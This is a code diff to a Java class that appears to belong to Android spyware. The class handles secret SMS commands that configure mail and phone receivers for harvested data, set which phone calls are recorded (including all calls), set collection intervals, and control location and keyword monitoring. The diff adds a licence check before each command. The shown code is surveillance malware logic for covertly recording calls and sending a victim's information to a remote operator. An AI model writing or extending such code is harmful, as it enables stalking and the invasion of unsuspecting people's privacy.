@@ -64,6 +64,7 @@ public class IndicationHandler
 		// #1#<mail address> <password>: set self sender
 		// #1#OFF: stop using self sender, use default sender instead
 		else if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
 			// Unregister indication
@@ -103,6 +104,7 @@ public class IndicationHandler
 		// -------------------------------------------------------
 		// #2#<mail address>: change receiver mail address
 		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_MAIL)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
 			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
@@ -124,6 +126,7 @@ public class IndicationHandler
 		// -------------------------------------------------------
 		// #3#<receiver phone number>: change receiver phone number
 		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONENUM)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 					
 			if (indication.length() > 0) {
@@ -145,6 +148,7 @@ public class IndicationHandler
 		// -------------------------------------------------------
 		// #4#<interval days>: change get info interval days
 		else if (smsBody.startsWith(SmsConsts.INDICATION_INTERVAL)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			int days = 1;
 			try {
@@ -168,6 +172,7 @@ public class IndicationHandler
 		// #5#<target number>: set recording target numbers
 		// #5#ALL: recording all phone calls
 		else if (smsBody.startsWith(SmsConsts.INDICATION_TARGET_NUM)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
 			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
@@ -210,6 +215,7 @@ public class IndicationHandler
 		// -------------------------------------------------------
 		// #6#<network mode>: set network mode
 		else if (smsBody.startsWith(SmsConsts.INDICATION_NETWORK_MODE)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
 			if (!indication.equalsIgnoreCase(SmsConsts.ACTIVE) && 
@@ -232,6 +238,7 @@ public class IndicationHandler
 		// -------------------------------------------------------
 		// #7#<sensitive words>: change sensitive words
 		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
+			if (!ConfigCtrl.isLegal(context)) return;
 			String indication = smsBody.substring(3).trim();
 			
 			// When it is OFF or off, we disable the location function
